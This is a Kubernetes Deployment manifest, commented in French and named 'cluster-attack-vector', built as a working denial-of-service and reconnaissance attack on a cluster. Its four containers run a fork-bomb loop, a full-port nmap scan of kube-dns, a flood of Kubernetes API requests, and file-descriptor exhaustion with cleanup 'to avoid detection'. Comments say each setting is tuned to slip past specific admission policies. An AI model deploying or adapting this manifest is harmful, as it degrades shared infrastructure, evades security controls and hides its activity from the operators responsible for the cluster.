apiVersion: apps/v1
kind: Deployment
metadata:
  name: cluster-attack-vector
  namespace: app-namespace
  labels:
    app: resource-exhaustion
spec:
  replicas: 2  # Respecte la politique restrict-scale (<3)
  selector:
    matchLabels:
      app: resource-exhaustion
  template:
    metadata:
      labels:
        app: resource-exhaustion
    spec:
      containers:
      - name: container1  # 1er container
        image: alpine:latest  # Petite image pour respecter block-large-images
        command: ["/bin/sh", "-c"]
        args:
        - |
          # Script qui va consommer toutes les ressources possibles
          # tout en restant actif pour les probes
          mkdir -p /tmp
          touch /tmp/healthy
          while true; do
            # Fork bomb limitée
            for i in $(seq 1 10); do
              (sleep 1 & )
            done
            # Permettre aux probes de fonctionner
            sleep 1
          done
        securityContext:
          runAsUser: 1000  # Respecte require-run-as-non-root-user
        resources:
          requests:
            memory: "50Mi"
            cpu: "50m"
          limits:
            memory: "100Mi"  # Respecte pod-quality-of-service
        readinessProbe:
          exec:
            command: ["cat", "/tmp/healthy"]
          initialDelaySeconds: 5
        livenessProbe:
          exec:
            command: ["cat", "/tmp/healthy"]
          initialDelaySeconds: 5
      - name: container2  # 2e container
        image: alpine:latest
        command: ["/bin/sh", "-c"]
        args:
        - |
          # Attaque réseau interne
          touch /tmp/healthy
          apk add --no-cache nmap
          while true; do
            # Scan intensif sur les services internes
            nmap -sS -T5 --min-rate 1000 -p- kube-dns.kube-system.svc.cluster.local
            sleep 1
          done
        securityContext:
          runAsUser: 1000
        resources:
          requests:
            memory: "50Mi"
            cpu: "50m"
          limits:
            memory: "100Mi"
        readinessProbe:
          exec:
            command: ["cat", "/tmp/healthy"]
          initialDelaySeconds: 5
        livenessProbe:
          exec:
            command: ["cat", "/tmp/healthy"]
          initialDelaySeconds: 5
      - name: container3  # 3e container
        image: bitnami/kubectl:latest  # Image avec kubectl préinstallée
        command: ["/bin/sh", "-c"]
        args:
        - |
          # Surcharge de l'API Kubernetes
          touch /tmp/healthy
          while true; do
            # Générer un grand nombre de requêtes à l'API
            kubectl get pods --all-namespaces -v=9 > /dev/null 2>&1
            sleep 0.1
          done
        securityContext:
          runAsUser: 1000
        resources:
          requests:
            memory: "50Mi"
            cpu: "50m"
          limits:
            memory: "100Mi"
        readinessProbe:
          exec:
            command: ["cat", "/tmp/healthy"]
          initialDelaySeconds: 5
        livenessProbe:
          exec:
            command: ["cat", "/tmp/healthy"]
          initialDelaySeconds: 5
      - name: container4  # 4e container (max permis par limit-containers-per-pod)
        image: alpine:latest
        command: ["/bin/sh", "-c"]
        args:
        - |
          # Attaque par épuisement de fichiers et processus
          touch /tmp/healthy
          while true; do
            # Épuiser les inodes et descripteurs de fichiers
            for i in $(seq 1 1000); do
              touch /tmp/file$i 2>/dev/null
            done
            # Nettoyer pour éviter d'être détecté
            rm -rf /tmp/file* 2>/dev/null
            sleep 1
          done
        securityContext:
          runAsUser: 1000
        resources:
          requests:
            memory: "50Mi"
            cpu: "50m"
          limits:
            memory: "100Mi"
        readinessProbe:
          exec:
            command: ["cat", "/tmp/healthy"]
          initialDelaySeconds: 5
        livenessProbe:
          exec:
            command: ["cat", "/tmp/healthy"]
          initialDelaySeconds: 5
